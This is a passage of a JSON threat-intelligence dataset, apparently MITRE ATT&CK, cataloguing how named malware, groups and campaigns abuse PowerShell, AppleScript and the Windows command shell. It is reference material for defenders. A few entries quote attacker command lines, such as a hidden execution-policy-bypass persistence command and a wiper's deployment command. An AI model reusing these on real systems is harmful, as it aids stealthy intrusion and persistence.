to delete volume shadow copies and download files."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin uses a command prompt to run a PowerShell script from Excel. To assist in establishing persistence, RogueRobin creates %APPDATA%\\OneDrive.bat and saves the following string to it:powershell.exe -WindowStyle Hidden -exec bypass -File \"%APPDATA%\\OneDrive.ps1\"."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear relies extensively on PowerShell execution from malicious attachments and related content to retrieve and execute follow-on payloads."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has used PowerShell for execution."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used PowerShell scripts to run a credential harvesting tool in memory to evade defenses."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic has the ability to execute PowerShell commands on a compromised machine."}, {"id": "S0053", "name": "SeaDuke", "description": "SeaDuke uses a module to execute Mimikatz with PowerShell to perform Pass the Ticket."}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper has the ability to execute a PowerShell script to get information from the infected host."}, {"id": "S0546", "name": "SharpStage", "description": "SharpStage can execute arbitrary commands with PowerShell."}, {"id": "S0450", "name": "SHARPSTATS", "description": "SHARPSTATS has the ability to employ a custom PowerShell script."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used PowerShell to drop and execute malware loaders."}, {"id": "G0091", "name": "Silence", "description": "Silence has used PowerShell to download and execute payloads."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can use PowerShell to execute commands."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM can execute Powershell commands sent from its C2 server."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 can use a PowerShell script for second-stage execution."}, {"id": "S0273", "name": "Socksbot", "description": "Socksbot can write and execute PowerShell scripts."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and execute other commands."}, {"id": "S1140", "name": "Spica", "description": "Spica can use an obfuscated PowerShell command to create a scheduled task for persistence."}, {"id": "S0390", "name": "SQLRat", "description": "SQLRat has used PowerShell to create a Meterpreter session."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has used PowerShell to execute its payload."}, {"id": "G0038", "name": "Stealth Falcon", "description": "Stealth Falcon malware uses PowerShell commands to perform various functions, including gathering system information via WMI and executing commands from its C2 server."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity can use PowerShell to add files to the Windows Defender exclusions list."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used PowerShell to download files and to inject into various Windows processes."}, {"id": "G0062", "name": "TA459", "description": "TA459 has used PowerShell for execution of a payload."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used PowerShell to download and execute malware and reconnaissance scripts."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has executed PowerShell commands in batch scripts."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has used PowerShell for execution."}, {"id": "G0076", "name": "Thrip", "description": "Thrip leveraged PowerShell to run commands to download payloads, traverse the compromised networks, and carry out reconnaissance."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has used Powershell scripts to perform post exploit collection."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team has used PowerShell to download additional payloads."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot has been known to use PowerShell to download new payloads, open documents, and upload data to command and control servers.  "}, {"id": "C0030", "name": "Triton Safety Instrumented System Attack", "description": "In the Triton Safety Instrumented System Attack, TEMP.Veles used a publicly available PowerShell-based tool, WMImplant."}, {"id": "G0010", "name": "Turla", "description": "Turla has used PowerShell to execute commands/scripts, in some cases via a custom executable or code from Empire's PSInject. Turla has also used PowerShell scripts to load and execute malware in memory."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif droppers have used PowerShell in download cradles to download and execute the malware's full executable payload."}, {"id": "S0476", "name": "Valak", "description": "Valak has used PowerShell to download additional modules."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used PowerShell including for remote system discovery."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can use PowerShell to download files and execute commands."}, {"id": "S0514", "name": "WellMess", "description": "WellMess can execute PowerShell scripts received from C2."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can use PowerShell to support multiple actions including execution and defense evasion."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern passed execution from document macros to PowerShell scripts during initial access operations. Winter Vivern used batch scripts that called PowerShell commands as part of initial access and installation operations."}, {"id": "G0090", "name": "WIRTE", "description": "WIRTE has used PowerShell for script execution."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used macros to execute PowerShell scripts to download malware on victim's machines. It has also used PowerShell to execute commands and move laterally through a victim network."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can execute PowerShell commands and scripts with the use of .NET DLL, WoodyPowerSession."}, {"id": "S0341", "name": "Xbash", "description": "Xbash can use scripts to invoke PowerShell to download a malicious PE executable or PE DLL for execution."}, {"id": "S1151", "name": "ZeroCleare", "description": "ZeroCleare can use a malicious PowerShell script to bypass Windows controls."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda uses PowerShell to download and execute the payload."}]}, {"name": "AppleScript", "description": "Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents. These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.", "detailed_description": "Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents. These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.\nScripts can be run from the command-line via osascript /path/to/script or osascript -e \"script here\". Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding #!/usr/bin/osascript to the start of the script file.\nAppleScripts do not need to call osascript to execute. However, they may be executed from within mach-O binaries by using the macOS Native APIs NSAppleScript or OSAScript, both of which execute code independent of the /usr/bin/osascript command line utility.\nAdversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute Native APIs, which otherwise would require compilation and execution in a mach-O binary file format. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via Python.", "id": "T1059.002", "examples": [{"id": "S0482", "name": "Bundlore", "description": "Bundlore can use AppleScript to inject malicious JavaScript into a browser."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can use osascript to generate a password-stealing prompt, duplicate files and folders, and set environmental variables."}, {"id": "S0281", "name": "Dok", "description": "Dok uses AppleScript to create a login item for persistence."}, {"id": "S1048", "name": "macOS.OSAMiner", "description": "macOS.OSAMiner has used osascript to call itself via the do shell script command in the Launch Agent .plist file."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest uses AppleScript's osascript -e command to launch ThiefQuest's persistence via Launch Agent and Launch Daemon. "}]}, {"name": "Windows Command Shell", "description": "Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.", "detailed_description": "Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.", "id": "T1059.003", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used the xp_cmdshell command in MS-SQL."}, {"id": "S0065", "name": "4H RAT", "description": "4H RAT has the capability to create a remote shell."}, {"id": "S0469", "name": "ABK", "description": "ABK has the ability to use cmd to run a Portable Executable (PE) on the compromised host."}, {"id": "S1028", "name": "Action RAT", "description": "Action RAT can use cmd.exe to execute commands on an infected host."}, {"id": "S0202", "name": "adbupd", "description": "adbupd can run a copy of cmd.exe."}, {"id": "G0018", "name": "admin@338", "description": "Following exploitation with LOWBALL malware, admin@338 actors created a file containing a list of commands to be executed on the compromised computer."}, {"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL can create a remote shell and run a given command."}, {"id": "G1030", "name": "Agrius", "description": "Agrius uses ASPXSpy web shells to enable follow-on command execution via cmd.exe."}, {"id": "S1129", "name": "Akira", "description": "Akira executes from the Windows command line and can take various arguments for execution."}, {"id": "S0504", "name": "Anchor", "description": "Anchor has used cmd.exe to run its self deletion routine."}, {"id": "G0006", "name": "APT1", "description": "APT1 has used the Windows command shell to execute commands, and batch scripting to automate execution."}, {"id": "G0026", "name": "APT18", "description": "APT18 uses cmd.exe to execute commands on the victim\u2019s machine."}, {"id": "G0007", "name": "APT28", "description": "An APT28 loader Trojan uses a cmd.exe and batch script to run its payload. The group has also used macros to execute payloads."}, {"id": "G0022", "name": "APT3", "description": "An APT3 downloader uses the Windows command \"cmd.exe\" /C whoami. The group also uses a tool to execute commands on remote computers."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used cmd.exe for execution."}, {"id": "G0067", "name": "APT37", "description": "APT37 has used the command-line interface."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used a command-line tunneler, NACHOCHEESE, to give them shell access to a victim\u2019s machine."}, {"id": "G0096", "name": "APT41", "description": "APT41 used cmd.exe /c to execute commands on remote machines.APT41 used a batch file to install persistence for the Cobalt Strike BEACON loader."}, {"id": "G1023", "name": "APT5", "description": "APT5 has used cmd.exe for execution on compromised systems."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda has attempted and failed to run Bash commands on a Windows host by passing them to cmd /C."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth spawns a CMD process to execute commands. "}, {"id": "S0347", "name": "AuditCred", "description": "AuditCred can open a reverse shell on the system to execute commands."}, {"id": "S1029", "name": "AuTo Stealer", "description": "AuTo Stealer can use cmd.exe to execute a created batch file."}, {"id": "S0638", "name": "Babuk", "description": "Babuk has the ability to use the command line to control execution on compromised hosts."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has used cmd.exe to execute commands."}, {"id": "S0475", "name": "BackConfig", "description": "BackConfig can download and run batch files to execute commands on a compromised host."}, {"id": "S0031", "name": "BACKSPACE", "description": "Adversaries can direct BACKSPACE to execute from the command line on infected hosts, or have BACKSPACE create a reverse shell."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can use cmd.exe to execute commands on a compromised host."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS is capable of executing commands via cmd.exe."}, {"id": "S0234", "name": "Bandook", "description": "Bandook is capable of spawning a Windows command shell."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot uses the command-line interface to execute arbitrary commands."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can launch cmd.exe to perform reconnaissance commands."}, {"id": "S0470", "name": "BBK", "description": "BBK has the ability to use cmd to run a Portable Executable (PE) on the compromised host."}, {"id": "S0017", "name": "BISCUIT", "description": "BISCUIT has a command to launch a command shell on the system."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has launched cmd.exe and used the ShellExecuteW() API function to execute commands on the system."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta can use cmd.exe to enable shadow copy deletion."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat can execute commands on a compromised network with the use of cmd.exe."}, {"id": "S0069", "name": "BLACKCOFFEE", "description": "BLACKCOFFEE has the capability to create a reverse shell."}, {"id": "S0564", "name": "BlackMould", "description": "BlackMould can run cmd.exe with parameters."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has executed commands via cmd.exe."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used batch script files to automate execution and deployment of payloads."}, {"id": "S0360", "name": "BONDUPDATER", "description": "BONDUPDATER can read batch commands in a file sent from its C2 server and execute them with cmd.exe."}, {"id": "S0651", "name": "BoxCaon", "description": "BoxCaon can execute arbitrary commands and utilize the \"ComSpec\" environment variable."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used batch scripts and the command-line interface for execution."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can use cmd.exe for execution."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can use cmd.exe to drop and run files."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors used cmd.exe to execute commands and run malicious binaries."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 used cmd.exe to execute reconnaissance commands."}, {"id": "S0025", "name": "CALENDAR", "description": "CALENDAR has a command to run cmd.exe to execute commands."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak has a command to create a reverse shell."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT can execute commands."}, {"id": "S0462", "name": "CARROTBAT", "description": "CARROTBAT has the ability to execute command line arguments on a compromised host."}, {"id": "S0572", "name": "Caterpillar WebShell", "description": "Caterpillar WebShell can run commands on the compromised asset with CMD functions."}, {"id": "S1043", "name": "ccf32", "description": "ccf32 has used cmd.exe for archiving data and deleting files."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has used cmd to execute tasks on the system."}, {"id": "S0674", "name": "CharmPower", "description": "The C# implementation of  the CharmPower command execution module can use cmd."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used the Windows Command Shell and batch scripts for execution on compromised hosts."}, {"id": "S0020", "name": "China Chopper", "description": "China Chopper's server component is capable of opening a command terminal."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has executed ransomware using batch scripts deployed via GPO."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can use cmd.exe for command execution."}, {"id": "S0611", "name": "Clop", "description": "Clop can use cmd.exe to help execute commands on the system."}, {"id": "S0106", "name": "cmd", "description": "cmd is used to execute programs and other actions at the command-line interface."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has used a JavaScript backdoor that is capable of launching cmd.exe to execute shell commands. The group has used an exploit toolkit known as Threadkit that launches .bat files."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike uses a command-line interface to interact with systems."}, {"id": "S0338", "name": "Cobian RAT", "description": "Cobian RAT can launch a remote command shell interface for executing commands."}, {"id": "S0369", "name": "CoinTicker", "description": "CoinTicker executes a bash script to establish a reverse shell."}, {"id": "S0244", "name": "Comnie", "description": "Comnie executes BAT scripts."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has used cmd.exe to execute commands."}, {"id": "S0575", "name": "Conti", "description": "Conti can utilize command line options to allow an attacker control over how it scans and encrypts files."}, {"id": "S1155", "name": "Covenant", "description": "Covenant provides access to a Command Shell in Windows environments for follow-on command execution and tasking."}, {"id": "S0046", "name": "CozyCar", "description": "A module in CozyCar allows arbitrary commands to be executed by invoking C:\\Windows\\System32\\cmd.exe."}, {"id": "S0115", "name": "Crimson", "description": "Crimson has the ability to execute commands with the COMSPEC environment variable."}, {"id": "S0625", "name": "Cuba", "description": "Cuba has used cmd.exe /c and batch files for execution."}, {"id": "S1014", "name": "DanBot", "description": "DanBot has the ability to execute arbitrary commands via cmd.exe."}, {"id": "G0070", "name": "Dark Caracal", "description": "Dark Caracal has used macros in Word documents that would download a second stage if executed."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet can launch a remote shell to execute commands on the victim\u2019s machine."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate uses a malicious Windows Batch script to run the Windows code utility to retrieve follow-on script payloads."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has dropped an mspaint.lnk shortcut to disk which launches a shell script that downloads and executes a file."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can use cmd.exe to add registry keys for persistence."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can use cmd.exe to execute commands."}, {"id": "S0187", "name": "Daserf", "description": "Daserf can execute shell commands."}, {"id": "S1052", "name": "DEADEYE", "description": "DEADEYE can run cmd /c copy /y /b C:\\Users\\public\\syslog_6-*.dat C:\\Users\\public\\syslog.dll to combine separated sections of code into a single DLL prior to execution."}, {"id": "S0243", "name": "DealersChoice", "description": "DealersChoice makes modifications to open-source scripts from GitHub and executes them on the victim\u2019s machine."}, {"id": "S0354", "name": "Denis", "description": "Denis can launch a remote shell to execute arbitrary commands on the victim\u2019s machine."}, {"id": "S0200", "name": "Dipsind", "description": "Dipsind can spawn remote shells."}, {"id": "S1021", "name": "DnsSystem", "description": "DnsSystem can use cmd.exe for execution."}, {"id": "S0186", "name": "DownPaper", "description": "DownPaper uses the command line."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has used various types of scripting to perform operations, including batch scripts."}, {"id": "S0547", "name": "DropBook", "description": "DropBook can execute arbitrary shell commands on the victims' machines."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack has used cmd.exe to add a persistent service."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can execute commands via cmd.exe."}, {"id": "S0593", "name": "ECCENTRICBANDWAGON", "description": "ECCENTRICBANDWAGON can use cmd to execute commands on a victim\u2019s machine."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has used batch files for execution and can launch Internet Explorer from cmd.exe."}, {"id": "S0082", "name": "Emissary", "description": "Emissary has the capability to create a remote shell and execute specified commands."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has used cmd.exe to run a PowerShell script. "}, {"id": "S0363", "name": "Empire", "description": "Empire has modules for executing scripts."}, {"id": "S0634", "name": "EnvyScout", "description": "EnvyScout can use cmd.exe to execute malicious files on compromised hosts."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has an integrated scripting engine to download and execute Lua scripts."}, {"id": "S0343", "name": "Exaramel for Windows", "description": "Exaramel for Windows has a command to launch a remote shell and executes commands on the victim\u2019s machine."}, {"id": "S0171", "name": "Felismus", "description": "Felismus uses command line for execution."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT executes batch scripts on the victim\u2019s machine, and can launch a reverse shell for command execution."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has executed malicious .bat files containing PowerShell commands."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has leveraged xp_cmdshell and Windows Command Shell to execute commands on a compromised machine. FIN13 has also attempted to leverage the \u2018xp_cmdshell\u2019 SQL procedure to execute remote commands on internal MS-SQL servers."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used kill.bat script to disable security tools."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 used the command prompt to launch commands on the victim\u2019s machine."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used a Batch file to automate frequently executed post compromise cleanup activities. FIN8 has also executed commands remotely via cmd.exe."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro can use cmd.exe to execute commands received from C2."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy has used cmd to execute commands on a compromised host."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used cmd.exe likely as a password changing mechanism."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors ran a command script to set up persistence as a scheduled task named \"WinUpdate\", as well as other encoded commands from the command-line "}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can use cmd.exe for execution on remote hosts."}, {"id": "C0007", "name": "FunnyDream", "description": "During FunnyDream, the threat actors used cmd.exe to execute the wmiexec.vbs script."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used the Windows command shell to execute commands."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used various batch scripts to establish C2 and download additional files. Gamaredon Group's backdoor malware has also been written to a batch file."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can use a batch script to delete itself."}, {"id": "S0249", "name": "Gold Dragon", "description": "Gold Dragon uses cmd.exe to execute commands for discovery."}, {"id": "S0493", "name": "GoldenSpy", "description": "GoldenSpy can execute remote commands via the command-line interface."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax can spawn a command shell, and execute native commands."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has the ability to use cmd.exe to execute commands passed from an Outlook C2 channel."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group malware can use cmd.exe to download and execute payloads and to execute commands on the system."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT executes commands remotely on the infected host."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy uses cmd.exe to execute itself in-memory."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent can use the Windows Command Shell to execute commands, including its own removal."}, {"id": "S0132", "name": "H1N1", "description": "H1N1 kills and disables services by using cmd.exe."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has used cmd.exe to execute commands on the victim's machine."}, {"id": "S0246", "name": "HARDRAIN", "description": "HARDRAIN uses cmd.exe to execute netshcommands."}, {"id": "S0391", "name": "HAWKBALL", "description": "HAWKBALL has created a cmd.exe reverse shell, executed commands, and uploaded output via the command line."}, {"id": "S0071", "name": "hcdLoader", "description": "hcdLoader provides command-line access to the compromised system."}, {"id": "S0170", "name": "Helminth", "description": "Helminth can provide a remote shell. One version of Helminth uses batch scripting."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper can use cmd.exe /Q/c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1 CSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1> \\\\127.0.0.1\\ADMIN$\\_1636727589.6007507 2>&1 to deploy on an infected system."}, {"id": "S0698", "name": "HermeticWizard", "description": "HermeticWizard can use cmd.exe for execution on compromised hosts."}, {"id": "S0087", "name": "Hi-Zor", "description": "Hi-Zor has the ability to create a reverse shell."}, {"id": "S0394", "name": "HiddenWasp", "description": "HiddenWasp uses a script to automate tasks on the victim's machine and to assist in execution."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa used cmd.exe for execution."}, {"id": "S0009", "name": "Hikit", "description": "Hikit has the ability to create a remote shell and run given commands."}, {"id": "S0232", "name": "HOMEFRY", "description": "HOMEFRY uses a command-line interface."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used Windows batch files for persistence and execution."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT can launch cmd.exe to execute commands on the system."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant can remotely open applications on the infected host with the ShellExecuteA command."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser is capable of spawning a reverse shell on a victim."}, {"id": "S0068", "name": "httpclient", "description": "httpclient opens cmd.exe on the victim."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has used cmd.exe to launch malicious payloads."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has used batch scripts on victim's machines."}, {"id": "S0259", "name": "InnaputRAT", "description": "InnaputRAT launches a shell to execute commands on the victim\u2019s machine."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can launch a remote shell to execute commands."}, {"id": "S1132", "name": "IPsec Helper", "description": "IPsec Helper can run arbitrary commands passed to it through cmd.exe."}, {"id": "S0015", "name": "Ixeshe", "description": "Ixeshe is capable of executing commands via cmd."}, {"id": "S0389", "name": "JCry", "description": "JCry has used cmd.exe to launch PowerShell."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT uses a .bat file to execute a .dll."}, {"id": "S0201", "name": "JPIN", "description": "JPIN can use the command-line utility cacls.exe to change file permissions."}, {"id": "S0283", "name": "jRAT", "description": "jRAT has command line access."}, {"id": "S0088", "name": "Kasidet", "description": "Kasidet can execute commands using cmd.exe."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar uses cmd.exe to execute commands on the victim\u2019s machine."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used batch scripts in its malware to install persistence mechanisms."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can use a renamed image of cmd.exe for execution."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy can launch interactive shells for communicating with the victim machine."}, {"id": "S0271", "name": "KEYMARBLE", "description": "KEYMARBLE can execute shell commands using cmd.exe."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY has the ability to set a Registry key to run a cmd.exe command."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has executed Windows commands by using cmd and running batch scripts."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can open an interactive command-shell to perform command line functions on victim machines. Koadic performs most of its operations using Windows Script Host (Jscript) and to run arbitrary shellcode."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS has used cmd.exe and batch files for execution."}, {"id": "S0156", "name": "KOMPROGO", "description": "KOMPROGO is capable of creating a reverse shell."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has used cmd.exe to execute arbitrary commands on the infected host across different stages of the infection chain."}, {"id": "S1160", "name": "Latrodectus", "description": "The Latrodectus command handler can use cmdexe to run multiple discovery commands."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware uses cmd.exe to execute commands on a compromised host. A Destover-like variant used by Lazarus Group uses a batch file mechanism to delete its binaries from the system."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has used batch files to deploy open-source and multi-stage RATs."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron is capable of executing commands via cmd.exe."}, {"id": "S0211", "name": "Linfo", "description": "Linfo creates a backdoor through which remote attackers can start a remote shell."}, {"id": "S0681", "name": "Lizar", "description": "Lizar has a command to open the command-line on the infected system."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has used cmd /c commands embedded within batch scripts."}, {"id": "S0582", "name": "LookBack", "description": "LookBack executes the cmd.exe command."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner used a batch script to run the Linux virtual machine as a service."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can issue shell commands to download and execute additional payloads."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can run shell commands using a BAT file with a name matching %TEMP%\\<\u2060random_9_alnum_chars>.batfile or through cmd.exe with the /c and /U option for Unicode output."}, {"id": "G0095", "name": "Machete", "description": "Machete has used batch files to initiate additional downloads of malicious files."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can execute shell commands using cmd.exe."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used the command-line interface for code execution."}, {"id": "S1156", "name": "Manjusaka", "description": "Manjusaka can execute arbitrary commands passed to it from the C2 controller via cmd.exe /c."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can utilize cmd.exe to execute commands in a victim's environment."}, {"id": "S0449", "name": "Maze", "description": "The Maze encryption process has used batch scripts with various commands."}, {"id": "S0500", "name": "MCMD", "description": "MCMD can launch a console process (cmd.exe) with redirected standard input and output."}, {"id": "S0459", "name": "MechaFlounder", "description": "MechaFlounder has the ability to run commands on a compromised host."}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex has used .cmd scripts on the victim's system."}, {"id": "G0045", "name": "menuPass", "description": "menuPass executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands. menuPass has used malicious macros embedded inside Office documents to execute files."}, {"id": "G1013", "name": "Metador", "description": "Metador has used the Windows command line to execute commands."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has used cmd.exe /c to execute files."}, {"id": "S0688", "name": "Meteor", "description": "Meteor can run set.bat, update.bat, cache.bat, bcd.bat, msrun.bat, and similar scripts."}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia creates a command-line shell using cmd.exe."}, {"id": "S1015", "name": "Milan", "description": "Milan can use cmd.exe for discovery actions on a targeted system."}, {"id": "S0280", "name": "MirageFox", "description": "MirageFox has the capability to execute commands using cmd.exe."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type has used cmd.exe to run commands on a compromised host."}, {"id": "S0083", "name": "Misdat", "description": "Misdat is capable of providing shell functionality to the attacker to execute commands."}, {"id": "S0080", "name": "Mivast", "description": "Mivast has the capability to open a remote shell and run basic commands."}, {"id": "S0553", "name": "MoleNet", "description": "MoleNet can execute commands via the command line utility."}, {"id": "S0149", "name": "MoonWind", "description": "MoonWind can execute commands via an interactive command shell. MoonWind uses batch scripts for various purposes, including to restart and uninstall itself."}, {"id": "S0284", "name": "More_eggs", "description": "More_eggs has used cmd.exe for execution."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito executes cmd.exe and uses a pipe to read the results and send back the output to the C2 server."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used a custom tool for creating reverse shells."}, {"id": "S1135", "name": "MultiLayer Wiper", "description": "MultiLayer Wiper uses a batch script launched via a scheduled task to delete Windows Event Logs."}, {"id": "S0233", "name": "MURKYTOP", "description": "MURKYTOP uses the command-line interface."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has executed HTA files via cmd.exe, and used batch scripts for collection."}, {"id": "S0336", "name": "NanoCore", "description": "NanoCore can open a remote command-line 